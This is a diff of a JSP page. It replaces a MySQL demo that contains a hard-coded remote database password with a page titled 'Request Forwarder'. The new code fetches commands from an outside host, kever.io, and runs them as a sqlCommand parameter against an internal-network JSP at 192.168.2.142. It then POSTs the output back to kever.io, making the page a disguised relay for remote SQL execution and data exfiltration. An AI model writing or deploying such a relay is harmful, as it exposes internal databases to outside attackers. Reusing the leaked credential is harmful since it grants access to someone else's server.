@@ -1,62 +1,55 @@
-<%@ page import="java.sql.Connection, java.sql.DriverManager, java.sql.ResultSet, java.sql.Statement" %>
-<%@ page import="java.io.PrintWriter" %>
-<%@ page import="java.io.StringWriter" %>
+<%@ page import="java.io.BufferedReader, java.io.InputStreamReader, java.io.OutputStreamWriter, java.net.HttpURLConnection, java.net.URL" %>
+<%@ page import="java.util.stream.Collectors" %>
 <html>
 <head>
-    <title>Remote MySQL Connection Example</title>
+    <title>Request Forwarder</title>
 </head>
 <body>
-    <h1>Data from Remote MySQL Database</h1>
+    <h1>Request Forwarder</h1>
     <%
-        // JDBC URL, username, and password of the MySQL server
-        String jdbcUrl = "jdbc:mysql://srv1140.hstgr.io:3306/u854855859_security";
-        String dbUsername = "u854855859_security"; // Changed variable name
-        String dbPassword = "6w1Gvqg[+sE$"; // Changed variable name
+        // Function to make a GET request
+        String makeGetRequest(String urlString) throws Exception {
+            URL url = new URL(urlString);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            String response = in.lines().collect(Collectors.joining());
+            in.close();
+            return response;
+        }
 
-        // JDBC variables for opening and managing connection
-        Connection conn = null;
-        Statement stmt = null;
-        ResultSet rs = null;
+        // Function to make a POST request
+        String makePostRequest(String urlString, String postData) throws Exception {
+            URL url = new URL(urlString);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
+            writer.write(postData);
+            writer.flush();
+            writer.close();
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            String response = in.lines().collect(Collectors.joining());
+            in.close();
+            return response;
+        }
 
         try {
-            // Load MySQL JDBC Driver
-            Class.forName("com.mysql.jdbc.Driver");
+            // Step 1: Make GET request to https://kever.io/jspListen.php
+            String initialResponse = makeGetRequest("https://kever.io/jspListen.php");
 
-            // Open a connection
-            conn = DriverManager.getConnection(jdbcUrl, dbUsername, dbPassword);
+            // Step 2: Use the output from the first request as the sqlCommand parameter in the second GET request
+            String encodedSqlCommand = java.net.URLEncoder.encode(initialResponse, "UTF-8");
+            String secondUrl = "http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=" + encodedSqlCommand;
+            String secondResponse = makeGetRequest(secondUrl);
 
-            // Execute SQL query
-            stmt = conn.createStatement();
-            String sql = "SELECT * FROM users";
-            rs = stmt.executeQuery(sql);
+            // Step 3: POST the result of the second request back to https://kever.io/jspListen.php
+            String postResponse = makePostRequest("https://kever.io/jspListen.php", "result=" + java.net.URLEncoder.encode(secondResponse, "UTF-8"));
 
-            // Extract data from result set
-            while (rs.next()) {
-                // Retrieve by column name
-                String user_id = rs.getString("user_id");
-                String user_name = rs.getString("username"); // Changed variable name
-
-                // Display values
-                out.println("User ID: " + user_id + ", Username: " + user_name + "<br>");
-            }
+            // Display the final response
+            out.println("Final response from POST: " + postResponse);
         } catch (Exception e) {
-            // Convert JspWriter to PrintWriter
-            StringWriter sw = new StringWriter();
-            PrintWriter pw = new PrintWriter(sw);
-            e.printStackTrace(pw);
-            out.println(sw.toString());
-        } finally {
-            // Clean-up environment
-            try {
-                if (rs != null) rs.close();
-                if (stmt != null) stmt.close();
-                if (conn != null) conn.close();
-            } catch (Exception e) {
-                StringWriter sw = new StringWriter();
-                PrintWriter pw = new PrintWriter(sw);
-                e.printStackTrace(pw);
-                out.println(sw.toString());
-            }
+            e.printStackTrace(out);
         }
     %>
 </body>
